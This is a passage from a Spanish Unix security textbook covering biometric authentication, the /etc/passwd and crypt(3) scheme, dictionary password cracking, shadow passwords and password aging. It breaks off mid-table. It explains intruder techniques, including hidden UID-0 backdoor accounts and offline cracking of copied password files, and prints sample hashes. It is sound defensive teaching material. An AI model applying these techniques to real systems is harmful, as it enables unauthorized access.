complejo &#x2013; de hasta 266 grados de libertad &#x2013; , inalterable durante toda la vida de la persona. El uso por
parte de un atacante de &#x00F3;rganos replicados o simulados para conseguir una falsa aceptaci&#x00F3;n es casi
imposible con an&#x00E1;lisis infrarrojo, capaz de detectar con una alta probabilidad si el iris es natural o
no.
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 505--><para>
heightwidthdepthiriscode.png                                                         <graphic width="430.0pt" fileref="iriscode.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1190013"  ></anchor>Figura&#x00A0;8.3</title><para>Iris humano con la extracci&#x00F3;n de su iriscode.</para></blockquote>

  </blockquote></figure>
<!--br/-->La identi&#xFB01;caci&#x00F3;n basada en el reconocimiento de iris es m&#x00E1;s moderna que la basada en patrones retinales;
desde hace unos a~nos el iris humano se viene utilizando para la autenticaci&#x00F3;n de usuarios (<citation>[?]</citation>, <citation>[?]</citation>). Para
ello, se captura una imagen del iris en blanco y negro, en un entorno correctamente iluminado; esta imagen
se somete a deformaciones pupilares (el tama~no de la pupila var&#x02CA;&#x0131;a enormemente en funci&#x00F3;n de factores
externos, como la luz) y de ella se extraen patrones, que a su vez son sometidos a transformaciones
matem&#x00E1;ticas (<citation>[?]</citation>) hasta obtener una cantidad de datos (t&#x02CA;&#x0131;picamente 256 KBytes) su&#xFB01;ciente para los
prop&#x00F3;sitos de autenticaci&#x00F3;n. Esa muestra, denominada iriscode (en la &#xFB01;gura  <ulink 
  url="#x1-1190013"  ><!--ref: iriscode--></ulink> se muestra una imagen de un
iris humano con su iriscode asociado) es comparada con otra tomada con anterioridad y almacenada en la
base de datos del sistema, de forma que si ambas coinciden el usuario se considera autenticado
con &#x00E9;xito; la probabilidad de una falsa aceptaci&#x00F3;n es la menor de todos los modelos biom&#x00E9;tricos
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->La empresa estadounidense IriScan es la principal desarrolladora de tecnolog&#x02CA;&#x0131;a (y de investigaciones)
basada en reconocimiento de iris que existe actualmente, ya que posee la patente sobre esta tecnolog&#x02CA;&#x0131;a; su
p&#x00E1;gina web, con interesantes art&#x02CA;&#x0131;culos sobre este modelo de autenticaci&#x00F3;n (a diferencia de la p&#x00E1;gina de
EyeDentify), se puede consultar en http://www.iriscan.com/.
  </section><!--end subsubsection--></section><!--end subsection--><!--l. 534--><section 
role="subsection"><title><abbrev role="title-mark">8.4.5</abbrev><anchor 
   id="x1-1200008.4.5"  ></anchor>Veri&#xFB01;caci&#x00F3;n de la geometr&#x02CA;&#x0131;a de la mano</title>
  <figure><title/><blockquote>


<section role="center"><title/>
<!--l. 536--><para>
heightwidthdepthhand.png                                                            <graphic width="430.0pt" fileref="hand.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1200014"  ></anchor>Figura&#x00A0;8.4</title><para>Geometr&#x02CA;&#x0131;a de una mano con ciertos par&#x00E1;metros extra&#x02CA;&#x0131;dos.</para></blockquote>

  </blockquote></figure> Los sistemas de autenticaci&#x00F3;n basados en el an&#x00E1;lisis de la geometr&#x02CA;&#x0131;a de la mano son sin duda los m&#x00E1;s
r&#x00E1;pidos dentro de los biom&#x00E9;tricos: con una probabilidad de error aceptable en la mayor&#x02CA;&#x0131;a de
ocasiones, en aproximadamente un segundo son capaces de determinar si una persona es quien dice
ser.
<!--br/-->
<!--br/-->Cuando un usuario necesita ser autenticado situa su mano sobre un dispositivo lector con unas gu&#x02CA;&#x0131;as que
marcan la posici&#x00F3;n correcta para la lectura (&#xFB01;gura  <ulink 
  url="#x1-1200014"  ><!--ref: hand--></ulink>). Una vez la mano est&#x00E1; correctamente situada, unas
c&#x00E1;maras toman una imagen superior y otra lateral, de las que se extraen ciertos datos (anchura, longitud,
&#x00E1;rea, determinadas distancias&#x2026;) en un formato de tres dimensiones. Transformando estos datos en un
modelo matem&#x00E1;tico que se contrasta contra una base de patrones, el sistema es capaz de permitir o denegar
acceso a cada usuario.
<!--br/-->
<!--br/-->Quiz&#x00E1;s uno de los elementos m&#x00E1;s importantes del reconocimiento mediante analizadores de geometr&#x02CA;&#x0131;a de la
mano es que &#x00E9;stos son capaces de aprender: a la vez que autentican a un usuario, actualizan su base de
datos con los cambios que se puedan producir en la muestra (un peque~no crecimiento, adelgazamiento, el
proceso de cicatrizado de una herida&#x2026;); de esta forma son capaces de identi&#xFB01;car correctamente a un
usuario cuya muestra se tom&#x00F3; hace a~nos, pero que ha ido accediendo al sistema con regularidad. Este hecho,
junto a su rapidez y su buena aceptaci&#x00F3;n entre los usuarios, hace que los autenticadores basados en la
geometr&#x02CA;&#x0131;a de la mano sean los m&#x00E1;s extendidos dentro de los biom&#x00E9;tricos a pesar de que su tasa de falsa
aceptaci&#x00F3;n se podr&#x02CA;&#x0131;a considerar inaceptable en algunas situaciones: no es normal, pero s&#x02CA;&#x0131; posible, que dos
personas tengan la mano lo su&#xFB01;cientemente parecida como para que el sistema las confunda.
Para minimizar este problema se recurre a la identi&#xFB01;caci&#x00F3;n basada en la geometr&#x02CA;&#x0131;a de uno o
dos dedos, que adem&#x00E1;s puede usar dispositivos lectores m&#x00E1;s baratos y proporciona incluso m&#x00E1;s
rapidez.
  </section><!--end subsection--></section><!--end section--><!--l. 571--><section 
role="section"><title><abbrev role="title-mark">8.5</abbrev><anchor 
   id="x1-1210008.5"  ></anchor>Autenticaci&#x00F3;n de usuarios en Unix</title>
<!--l. 573--><para>
  </para><!--l. 573--><section 
role="subsection"><title><abbrev role="title-mark">8.5.1</abbrev><anchor 
   id="x1-1220008.5.1"  ></anchor>Autenticaci&#x00F3;n cl&#x00E1;sica</title>
<!--l. 574--><para>  En un sistema Unix habitual cada usuario posee un nombre de entrada al sistema o login y una clave o
password; ambos datos se almacenan generalmente en el &#xFB01;chero /etc/passwd. Este archivo contiene una
l&#x02CA;&#x0131;nea por usuario (aunque hay entradas que no corresponden a usuarios reales, como veremos a
continuaci&#x00F3;n) donde se indica la informaci&#x00F3;n necesaria para que los usuarios puedan conectar al sistema y
trabajar en &#x00E9;l, separando los diferentes campos mediante &#x2018;:&#x2019;. Por ejemplo, podemos encontrar entradas
parecidas a la siguiente:
</para><section role="center"><title/>
<!--l. 582--><para> toni:LEgPN8jqSCHCg:1000:100:Antonio Villalon,,,:/export/home/toni:/bin/sh
</para></section>
<!--l. 585--><para>En primer lugar aparecen el login del usuario y su clave cifrada; a continuaci&#x00F3;n tenemos dos n&#x00FA;meros que ser&#x00E1;n
el identi&#xFB01;cador de usuario y el de grupo respectivamente. El quinto campo, denominado GECOS es
simplemente informaci&#x00F3;n administrativa sobre la identidad real del usuario, como su nombre, tel&#x00E9;fono o
n&#x00FA;mero de despacho. Finalmente, los dos &#x00FA;ltimos campos corresponden al directorio del usuario (su $HOME
inicial) y al shell que le ha sido asignado.
<!--br/-->
<!--br/-->Al contrario de lo que mucha gente cree, Unix no es capaz de distinguir a sus usuarios por su nombre de
entrada al sistema. Para el sistema operativo lo que realmente distingue a una persona de otra (o al menos
a un usuario de otro) es el UID del usuario en cuesti&#x00F3;n; el login es algo que se utiliza principalmente para
comodidad de las personas (obviamente es m&#x00E1;s f&#x00E1;cil acordarse de un nombre de entrada como toni que de un
UID como 2643, sobre todo si se tienen cuentas en varias m&#x00E1;quinas, cada una con un UID diferente). Por
tanto, si en /etc/passwd existen dos entradas con un mismo UID, para Unix se tratar&#x00E1; del mismo
usuario, aunque tengan un login y un password diferente: as&#x02CA;&#x0131;, si dos usuarios tienen asignado el

UID 0, ambos tendr&#x00E1;n privilegios de superusuario, sin importar el login que utilicen. Esto es
especialmente aprovechado por atacantes que han conseguido privilegios de administrador en
una m&#x00E1;quina: pueden a~nadir una l&#x02CA;&#x0131;nea a /etc/passwd mezclada entre todas las dem&#x00E1;s, con
un nombre de usuario normal pero con el UID 0; as&#x02CA;&#x0131; garantizan su entrada al sistema como
administradores en caso de ser descubiertos, por ejemplo para borrar huellas. Como a simple vista puede
resultar dif&#x02CA;&#x0131;cil localizar la l&#x02CA;&#x0131;nea insertada, especialmente en sistemas con un gran n&#x00FA;mero de
usuarios, para detectar las cuentas con privilegios en la m&#x00E1;quina podemos utilizar la siguiente
orden:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$3==0&#x00A0;{print&#x00A0;$1}&#x2019;&#x00A0;/etc/passwd
&#x00A0;root
&#x00A0;anita:~#
</literallayout>
<!--l. 620--><para>En el &#xFB01;chero de claves van a existir entradas que no corresponden a usuarios reales, sino que son utilizadas
por ciertos programas o se trata de cuentas mantenidas por motivos de compatibilidad con otros
sistemas; t&#x02CA;&#x0131;picos ejemplos de este tipo de entradas son lp, uucp o postmaster. Estas cuentas han
de estar bloqueadas en la mayor&#x02CA;&#x0131;a de casos, para evitar que alguien pueda utilizarlas para
acceder a nuestro sistema: s&#x00F3;lo han de ser accesibles para el root mediante la orden su. Aunque
en su mayor&#x02CA;&#x0131;a cumplen esta condici&#x00F3;n, en algunos sistemas estas cuentas tienen claves por
defecto o, peor, no tienen claves, lo que las convierte en una puerta completamente abierta
a los intrusos; es conveniente que, una vez instalado el sistema operativo, y antes de poner
a trabajar la m&#x00E1;quina, comprobemos que est&#x00E1;n bloqueadas, o en su defecto que tienen claves
no triviales. Algunos ejemplos de cuentas sobre los que hay que prestar una especial atenci&#x00F3;n
son <anchor 
   id="x1-122001f4"  ></anchor><footnote><para>     Hemos preferido no mostrar las claves por defecto (si las tienen) ni el sistema operativo concreto.</para></footnote>
root, guest, lp, demos, 4DGifts, tour, uucp, nuucp, games o postmaster; es muy recomendable
consultar los manuales de cada sistema concreto, y chequear peri&#x00F3;dicamente la existencia de cuentas sin
clave o cuentas que deber&#x02CA;&#x0131;an permanecer bloqueadas y no lo est&#x00E1;n.
<!--br/-->
<!--br/-->Para cifrar las claves de acceso de sus usuarios, el sistema operativo Unix emplea un criptosistema
irreversible que utiliza la funci&#x00F3;n est&#x00E1;ndar de C crypt(3), basada en el algoritmo DES. Para una descripci&#x00F3;n
exhaustiva del funcionamiento de crypt(3) se puede consultar <citation>[?]</citation>, <citation>[?]</citation> o <citation>[?]</citation>. Esta funci&#x00F3;n toma como clave
los ocho primeros caracteres de la contrase~na elegida por el usuario (si la longitud de &#x00E9;sta es menor, se
completa con ceros) para cifrar un bloque de texto en claro de 64 bits puestos a cero; para evitar que
dos passwords iguales resulten en un mismo texto cifrado, se realiza una permutaci&#x00F3;n durante
el proceso de cifrado elegida de forma autom&#x00E1;tica y aleatoria para cada usuario, basada en
un campo formado por un n&#x00FA;mero de 12 bits (con lo que conseguimos 4096 permutaciones
diferentes) llamado salt. El cifrado resultante se vuelve a cifrar utilizando la contrase~na del usuario
de nuevo como clave, y permutando con el mismo salt, repiti&#x00E9;ndose el proceso 25 veces. El
bloque cifrado &#xFB01;nal, de 64 bits, se concatena con dos bits cero, obteniendo 66 bits que se hacen
representables en 11 caracteres de 6 bits cada uno y que, junto con el salt, pasan a constituir el
campo password del &#xFB01;chero de contrase~nas, usualmente /etc/passwd. As&#x02CA;&#x0131;, los dos primeros
caracteres de este campo estar&#x00E1;n constituidos por el salt y los 11 restantes por la contrase~na
cifrada:
</para><section role="center"><title/>
<!--l. 662--><para> toni:LEgPN8jqSCHCg:1000:100:Antonio Villalon,,,:/export/home/toni:/bin/sh
</para><!--l. 664--><para>SALT: LE                    PASSWORD CIFRADO: gPN8jqSCHCg</para></section>
<!--l. 667--><para>Como hemos dicho antes, este criptosistema es irreversible. Entonces, &#x00BF;c&#x00F3;mo puede un usuario conectarse a
una m&#x00E1;quina Unix? El proceso es sencillo: el usuario introduce su contrase~na, que se utiliza como clave para
cifrar 64 bits a 0 bas&#x00E1;ndose en el salt, le&#x02CA;&#x0131;do en /etc/passwd, de dicho usuario. Si tras aplicar el
algoritmo de cifrado el resultado se corresponde con lo almacenado en los &#x00FA;ltimos 11 caracteres del
campo password del &#xFB01;chero de contrase~nas, la clave del usuario se considera v&#x00E1;lida y se permite
el acceso. En caso contrario se le deniega y se almacena en un &#xFB01;chero el intento de conexi&#x00F3;n
fallido.
  </para></section><!--end subsection--><!--l. 677--><section 
role="subsection"><title><abbrev role="title-mark">8.5.2</abbrev><anchor 
   id="x1-1230008.5.2"  ></anchor>Mejora de la seguridad</title>

<!--l. 678--><para>
  </para><!--l. 678--><section 
role="subsubsection"><title><anchor 
   id="x1-1240008.5.2"  ></anchor>Problemas del modelo cl&#x00E1;sico</title>
<!--l. 679--><para>  Los ataques de texto cifrado escogido constituyen la principal amenaza al sistema de autenticaci&#x00F3;n de
Unix; a diferencia de lo que mucha gente cree, no es posible descifrar una contrase~na, pero es muy f&#x00E1;cil
cifrar una palabra junto a un determinado salt, y comparar el resultado con la cadena almacenada en el
&#xFB01;chero de claves. De esta forma, un atacante leer&#x00E1; el &#xFB01;chero /etc/passwd (este &#xFB01;chero ha de tener permiso
de lectura para todos los usuarios si queremos que el sistema funcione correctamente), y mediante un
programa adivinador (o crackeador) como Crack o John the Ripper cifrar&#x00E1; todas las palabras de un
&#xFB01;chero denominado diccionario (un &#xFB01;chero ASCII con un gran n&#x00FA;mero de palabras de cualquier
idioma o campo de la sociedad &#x2013; historia cl&#x00E1;sica, deporte, cantantes de rock&#x2026;), comparando el
resultado obtenido en este proceso con la clave cifrada del &#xFB01;chero de contrase~nas; si ambos
coinciden, ya ha obtenido una clave para acceder al sistema de forma no autorizada. Este
proceso se puede pero no se suele hacer en la m&#x00E1;quina local, ya que en este caso hay bastantes
posibilidades de detectar el ataque: desde modi&#xFB01;car en c&#x00F3;digo de la funci&#x00F3;n crypt(3) para que alerte al
administrador cuando es invocada repetidamente (cada vez que el adivinador cifra una palabra utiliza
esta funci&#x00F3;n) hasta simplemente darse cuenta de una carga de CPU excesiva (los programas
adivinadores suelen consumir un tiempo de procesador considerable). Lo habitual es que el atacante
trans&#xFB01;era una copia del archivo a otro ordenador y realice el proceso en esta otra m&#x00E1;quina; ni
siquiera se tiene que tratar de un servidor Unix con gran capacidad de c&#x00F3;mputo: existen muchos
programas adivinadores que se ejecutan en un PC normal, bajo MS-DOS o Windows. Obviamente,
este segundo caso es mucho m&#x00E1;s dif&#x02CA;&#x0131;cil de detectar, ya que se necesita una auditor&#x02CA;&#x0131;a de los
programas que ejecuta cada usuario (y utilidades como cp o ftp no suelen llamar la atenci&#x00F3;n del
administrador). Esta auditor&#x02CA;&#x0131;a la ofrecen muchos sistemas Unix (generalmente en los &#xFB01;cheros de log
/var/adm/pacct o /var/adm/acct), pero no se suele utilizar por los excesivos recursos que puede
consumir, incluso en sistemas peque~nos; obviamente, no debemos &#xFB01;arnos nunca de los archivos
hist&#x00F3;ricos de &#x00F3;rdenes del usuario (como $HOME/.sh<informalequation><graphic 
fileref="unixsec63x.gif"></graphic></informalequation>history o $HOME/.bash<informalequation><graphic 
fileref="unixsec64x.gif"></graphic></informalequation>history), ya que el
atacante los puede modi&#xFB01;car para ocultar sus actividades, sin necesidad de ning&#x00FA;n privilegio
especial.
  </para></section><!--end subsubsection--><!--l. 715--><section 
role="subsubsection"><title><anchor 
   id="x1-1250008.5.2"  ></anchor>Contrase~nas aceptables</title>
<!--l. 716--><para>  La principal forma de evitar este tipo de ataque es utilizar passwords que no sean palabras de los
&#xFB01;cheros diccionario t&#x02CA;&#x0131;picos: combinaciones de min&#x00FA;sculas y may&#x00FA;sculas, n&#x00FA;meros mezclados con texto,
s&#x02CA;&#x0131;mbolos como &#x0026;, $ o %, etc. Por supuesto, hemos de huir de claves simples como internet o beatles,
nombres propios, combinaciones d&#x00E9;biles como Pepito1 o qwerty, nombres de lugares, actores, personajes de
libros, deportistas&#x2026;Se han realizado numerosos estudios sobre c&#x00F3;mo evitar este tipo de passwords en los
usuarios (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;), y tambi&#x00E9;n se han dise~nado potentes herramientas para
lograrlo, como Npasswd o Passwd+ (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;). Es bastante recomendable instalar alguna
de ellas para &#x2018;obligar&#x2019; a los usuarios a utilizar contrase~nas aceptables (muchos Unices ya las
traen incorporadas), pero no conviene con&#xFB01;ar toda la seguridad de nuestro sistema a estos
programas <anchor 
   id="x1-125001f5"  ></anchor><footnote><para>     &#x00A1;Ni a ning&#x00FA;n otro!</para></footnote>.
Como norma, cualquier administrador deber&#x02CA;&#x0131;a ejecutar con cierta periodicidad alg&#x00FA;n programa adivinador,
tipo Crack, para comprobar que sus usuarios no han elegidos contrase~nas d&#x00E9;biles (a pesar del uso de
Npasswd o Passwd+): se puede tratar de claves generadas antes de instalar estas utilidades
o incluso de claves asignadas por el propio root que no han pasado por el control de estos
programas.
<!--br/-->
<!--br/-->Por &#x00FA;ltimo es necesario recordar que para que una contrase~na sea aceptable obligatoriamente ha de cumplir
el principio KISS, que hablando de passwords est&#x00E1; claro que no puede signi&#xFB01;car &#x2018;Keep it simple, stupid!&#x2019;
sino &#x2018;Keep it SECRET, stupid!&#x2019;. La contrase~na m&#x00E1;s larga, la m&#x00E1;s dif&#x02CA;&#x0131;cil de recordar, la que combina
m&#x00E1;s caracteres no alfab&#x00E9;ticos&#x2026;pierde toda su robustez si su propietario la comparte con otras
personas <anchor 
   id="x1-125002f6"  ></anchor><footnote><para>     &#x2018;Three can keep a secret&#x2026;if two of them are dead&#x2019;. Benjamin Franklin.</para></footnote>.
</para><section role="center"><title/>

<!--l. 746--><para> Para veri&#xFB01;car el hecho que de no hay que con&#xFB01;ar toda la seguridad de un sistema a ning&#x00FA;n
 programa, hemos crackeado el &#xFB01;chero de claves de un servidor de la Universidad Polit&#x00E9;cnica
 de Valencia. Se trata de un sistema Unix con unos 1300 usuarios, dedicado a c&#x00E1;lculo cient&#x02CA;&#x0131;&#xFB01;co
 (obviamente, no vamos a decir el nombre del servidor). A pesar de utilizar un mecanismo
 que no permite que los usuarios elijan claves d&#x00E9;biles, en menos de dos horas de ejecuci&#x00F3;n sobre
 un Pentium MMX a 233 MHz el programa Crack corriendo sobre Solaris ha encontrado seis
 claves de usuario utilizando exclusivamente diccionarios de demostraci&#x00F3;n que acompa~nan al
 programa (seguramente si utiliz&#x00E1;ramos diccionarios en castellano o relacionados con temas
 como el deporte o la m&#x00FA;sica nacionales &#x2013; que los hay&#x2013; habr&#x02CA;&#x0131;amos encontrado alguna clave
 m&#x00E1;s&#x2026;). Se puede pensar que s&#x00F3;lo seis usuarios de entre 1300 es algo bastante aceptable, pero
 no es as&#x02CA;&#x0131;: cualquier combinaci&#x00F3;n v&#x00E1;lida de login y password es una puerta abierta en nuestro
 sistema; si un intruso consigue entrar por esta puerta, tiene m&#x00E1;s del 70 % del camino recorrido
 para obtener el control total de la m&#x00E1;quina. Si queremos conseguir un sistema m&#x02CA;&#x0131;nimamente
 &#xFB01;able, no podemos permitir ni una sola clave d&#x00E9;bil.
 <!--br/-->Sin embargo, tampoco hay que pensar que programas como Passwd+ no desempe~nan bien
 su labor: en 1994, cuando en el sistema con el que hemos realizado la prueba anterior no
 dispon&#x02CA;&#x0131;a de estos mecanismos de seguridad, en menos de 12 horas de ejecuci&#x00F3;n de un programa
 adivinador sobre un 486DX a 33 MHz utilizando Linux, se consiguieron extraer m&#x00E1;s de cien
 claves, entre ellas algunas de usuarios con cierto nivel de privilegio dentro del sistema.    </para></section>
<!--l. 776--><para>
  </para></section><!--end subsubsection--><!--l. 776--><section 
role="subsubsection"><title><anchor 
   id="x1-1260008.5.2"  ></anchor>Shadow Password</title>
<!--l. 777--><para>  Otro m&#x00E9;todo cada d&#x02CA;&#x0131;a m&#x00E1;s utilizado para proteger las contrase~nas de los usuarios el denominado Shadow
Password u oscurecimiento de contrase~nas. La idea b&#x00E1;sica de este mecanismo es impedir que los usuarios sin
privilegios puedan leer el &#xFB01;chero donde se almacenan las claves cifradas; en el punto anterior hemos
comentado que el &#xFB01;chero /etc/passwd tiene que tener permiso de lectura para todo el mundo si queremos
que el sistema funcione correctamente. En equipos con oscurecimiento de contrase~nas este &#xFB01;chero sigue
siendo legible para todos los usuarios, pero a diferencia del mecanismo tradicional, las claves cifradas no se
guardan en &#x00E9;l, sino en el archivo /etc/shadow, que s&#x00F3;lo el root puede leer. En el campo correspondiente a
la clave cifrada de /etc/passwd no aparece &#x00E9;sta, sino un s&#x02CA;&#x0131;mbolo que indica a determinados
programas (como /bin/login) que han de buscar las claves en /etc/shadow, generalmente una
x:
</para><section role="center"><title/>
<!--l. 791--><para> toni:x:1000:100:Antonio Villalon,,,:/export/home/toni:/bin/sh
</para></section>
<!--l. 794--><para>El aspecto de /etc/shadow es en cierta forma similar al de /etc/passwd que ya hemos comentado: existe
una l&#x02CA;&#x0131;nea por cada usuario del sistema, en la que se almacena su login y su clave cifrada. Sin embargo, el
resto de campos de este &#xFB01;chero son diferentes; corresponden a informaci&#x00F3;n que permite implementar otro
mecanismo para proteger las claves de los usuarios, el envejecimiento de contrase~nas o Aging Password, del
que hablaremos a continuaci&#x00F3;n:
</para><section role="center"><title/>
<!--l. 801--><para> toni:LEgPN8jqSCHCg:10322:0:99999:7:::</para></section>
<!--l. 804--><para>Desde hace un par de a~nos, la gran mayor&#x02CA;&#x0131;a de Unices del mercado incorporan este mecanismo; si
al instalar el sistema operativo las claves aparecen almacenadas en /etc/passwd podemos
comprobar si existe la orden pwconv, que convierte un sistema cl&#x00E1;sico a uno oscurecido. Si no
es as&#x02CA;&#x0131;, o si utilizamos un Unix antiguo que no posee el mecanismo de Shadow Password, es
muy conveniente que consigamos el paquete que lo implementa (seguramente se tratar&#x00E1; de un
&#xFB01;chero shadow.tar.gz que podemos encontar en multitud de servidores, adecuado a nuestro
clon de Unix) y lo instalemos en el equipo. Permitir que todos los usuarios lean las claves
cifradas ha representado durante a~nos, y sigue representando, uno de los mayores problemas de
seguridad de Unix; adem&#x00E1;s, una de las actividades preferidas de piratas novatos es intercambiar

&#xFB01;cheros de claves de los sistemas a los que acceden y crackearlos, con lo que es su&#xFB01;ciente una
persona que lea nuestro &#xFB01;chero para tener en poco tiempo una colonia de intrusos en nuestro
sistema.
  </para></section><!--end subsubsection--><!--l. 819--><section 
role="subsubsection"><title><anchor 
   id="x1-1270008.5.2"  ></anchor>Envejecimiento de contrase~nas</title>
<!--l. 820--><para>  En casi todas las implementaciones de Shadow Password
actuales <anchor 
   id="x1-127001f7"  ></anchor><footnote><para>     AT&#x0026;T/USL fu&#x00E9; el pionero en utilizar envejecimiento junto al shadow password.</para></footnote>
se suele incluir la implementaci&#x00F3;n para otro mecanismo de protecci&#x00F3;n de las claves denominado
envejecimiento de contrase~nas (Aging Password). La idea b&#x00E1;sica de este mecanismo es proteger los
passwords de los usuarios d&#x00E1;ndoles un determinado periodo de vida: una contrase~na s&#x00F3;lo va a ser v&#x00E1;lida
durante un cierto tiempo, pasado el cual expirar&#x00E1; y el usuario deber&#x00E1; cambiarla.
<!--br/-->
<!--br/-->Realmente, el envejecimiento previene m&#x00E1;s que problemas con las claves problemas con la transmisi&#x00F3;n de
&#x00E9;stas por la red: cuando conectamos mediante mecanismos como telnet, ftp o rlogin a un sistema
Unix, cualquier equipo entre el nuestro y el servidor puede leer los paquetes que enviamos por
la red, incluyendo aquellos que contienen nuestro nombre de usuario y nuestra contrase~na
(hablaremos de esto m&#x00E1;s a fondo en los cap&#x02CA;&#x0131;tulos dedicados a la seguridad del sistema de red y a la
criptograf&#x02CA;&#x0131;a); de esta forma, un atacante situado en un ordenador intermedio puede obtener muy
f&#x00E1;cilmente nuestro login y nuestro password. Si la clave capturada es v&#x00E1;lida inde&#xFB01;nidamente, esa
persona tiene un acceso asegurado al servidor en el momento que quiera; sin embargo, si la clave
tiene un periodo de vida, el atacante s&#x00F3;lo podr&#x00E1; utilizarla antes de que el sistema nos obligue a
cambiarla.
<!--br/-->
<!--br/-->A primera vista, puede parecer que la utilidad del envejecimiento de contrase~nas no es muy grande;
al &#xFB01;n y al cabo, la lectura de paquetes destinados a otros equipos (sni&#xFB03;ng) no se hace por
casualidad: el atacante que lea la red en busca de claves y nombres de usuario lo va a hacer
porque quiere utilizar estos datos contra un sistema. Sin embargo, una pr&#x00E1;ctica habitual es dejar
programas escuchando durante d&#x02CA;&#x0131;as y grabando la informaci&#x00F3;n le&#x02CA;&#x0131;da en &#xFB01;cheros; cada cierto
tiempo el pirata consultar&#x00E1; los resultados de tales programas, y si la clave le&#x02CA;&#x0131;da ya ha expirado
y su propietario la ha cambiado por otra, el haberla capturado no le servir&#x00E1; de nada a ese
atacante.
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 853--><para> heightwidthdepthadmintool.png<graphic width="62.7778pt" fileref="admintool.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1270025"  ></anchor>Figura&#x00A0;8.5</title><para>La herramienta de administraci&#x00F3;n admintool (Solaris), con opciones para envejecimiento
de claves.</para></blockquote>

  </blockquote></figure>
<!--br/-->Los periodos de expiraci&#x00F3;n de las claves se suelen de&#xFB01;nir a la hora de crear a los usuarios con las
herramientas que cada sistema ofrece para ello (por ejemplo, Solaris y su admintool, mostrado en la &#xFB01;gura
<ulink 
  url="#x1-1270025"  ><!--ref: admintool--></ulink>). Si queremos modi&#xFB01;car alguno de estos periodos una vez establecidos, desde esas mismas herramientas de
administraci&#x00F3;n podremos hacerlo, y tambi&#x00E9;n desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes mediante &#x00F3;rdenes como chage o usermod.
Como antes hemos dicho, en el archivo /etc/shadow se almacena, junto a la clave cifrada de cada usuario,
la informaci&#x00F3;n necesaria para implementar el envejecimiento de contrase~nas; una entrada de este archivo es
de la forma
<section role="center"><title/>
<!--l. 870--><para> toni:LEgPN8jqSCHCg:10322:0:99999:7:::</para></section>
<!--l. 873--><para>Tras el login y el password de cada usuario se guardan los campos siguientes:
     </para><itemizedlist>
     <listitem>
     <!--l. 876--><para>D&#x02CA;&#x0131;as transcurridos desde el 1 de enero de 1970 hasta que la clave se cambi&#x00F3; por &#x00FA;ltima vez.
     </para></listitem>
     <listitem>
     <!--l. 878--><para>D&#x02CA;&#x0131;as que han de transcurrir antes de que el usuario pueda volver a cambiar su contrase~na.
     </para></listitem>
     <listitem>
     <!--l. 880--><para>D&#x02CA;&#x0131;as tras los cuales se ha de cambiar la clave.
     </para></listitem>
     <listitem>
     <!--l. 881--><para>D&#x02CA;&#x0131;as durante los que el usuario ser&#x00E1; avisado de que su clave va a expirar antes de que &#x00E9;sta lo
     haga.
     </para></listitem>
     <listitem>
     <!--l. 883--><para>D&#x02CA;&#x0131;as que la cuenta estar&#x00E1; habilitada tras la expiraci&#x00F3;n de la clave.
     </para></listitem>
     <listitem>
     <!--l. 885--><para>D&#x02CA;&#x0131;as desde el 1 de enero de 1970 hasta que la cuenta se deshabilite.
     </para></listitem>
     <listitem>
     <!--l. 886--><para>Campo reservado.</para></listitem></itemizedlist>
<!--l. 888--><para>Como podemos ver, cuando un usuario cambia su clave el sistema le impide volverla a cambiar durante un
periodo de tiempo; con esto se consigue que cuando el sistema obligue a cambiar la contrase~na el usuario
no restaure inmediatamente su clave antigua (en este caso el esquema no servir&#x02CA;&#x0131;a de nada). Cuando este
periodo &#xFB01;naliza, suele existir un intervalo de cambio voluntario: est&#x00E1; permitido el cambio de contrase~na,
aunque no es obligatorio; al &#xFB01;nalizar este nuevo periodo, el password ha expirado y ya es obligatorio
cambiar la clave. Si el n&#x00FA;mero m&#x00E1;ximo de d&#x02CA;&#x0131;as en los que el usuario no puede cambiar su contrase~na es
mayor que el n&#x00FA;mero de d&#x02CA;&#x0131;as tras los cuales es obligatorio el cambio, el usuario no puede cambiar nunca
su clave. Si tras el periodo de cambio obligatorio el password permanece inalterado, la cuenta se
bloquea.
<!--br/-->
<!--br/-->En los sistemas Unix m&#x00E1;s antiguos (hasta System V Release 3.2), sin shadow password, toda la informaci&#x00F3;n
de envejecimiento se almacena en /etc/passwd, junto al campo correspondiente a la clave cifrada de cada
usuario pero separada de &#x00E9;ste por una coma:

</para><section role="center"><title/>
<!--l. 904--><para> root:cp5zOHITeZLWM,A.B8:0:0:El Spiritu Santo,,,:/root:/bin/bash</para></section>
<section role="center"><title/>
<!--l. 908--><para> </para><table ><informaltable><tgroup cols="16"><tbody><row><entry 
 align="center"><para>    Car&#x00E1;cter      </para></entry><entry 
 align="center"><para> . </para></entry><entry 
 align="center"><para>/ </para></entry><entry 
 align="center"><para>0 </para></entry><entry 
 align="center"><para>1 </para></entry><entry 
 align="center"><para> 2 </para></entry><entry 
 align="center"><para>3 </para></entry><entry 
 align="center"><para>4 </para></entry><entry 
 align="center"><para>5 </para></entry><entry 
 align="center"><para>6 </para></entry><entry 
 align="center"><para>7 </para></entry><entry 
 align="center"><para>8 </para></entry><entry 
 align="center"><para>9 </para></entry><entry 
 align="center"><para>A</para></entry><entry 
 align="center"><para>B</para></entry><entry 
 align="center"><para>C</para></entry>
 </row><row><entry 
 align="center"><para>Valor (semanas)</para></entry><entry 
 align="center"><para>1 </para></entry><entry 
 align="center"><para>2 </para></entry><entry 
 align="center"><para>3 </para></entry><entry 
 align="center"><para>4 </para></entry><entry 
 align="center"><para> 5 </para></entry><entry 
 align="center"><para>6 </para></entry><entry 
 align="center"><para>7 </para></entry><entry 
 align="center"><para>8 </para></entry><entry 
 align="center"><para>9 </para></entry><entry 
 align="center"><para>10</para></entry><entry 
 align="center"><para>11</para></entry><entry 
 align="center"><para>12</para></entry><entry 
 align="center"><para>13</para></entry><entry 
 align="center"><para>14</para></entry><entry 
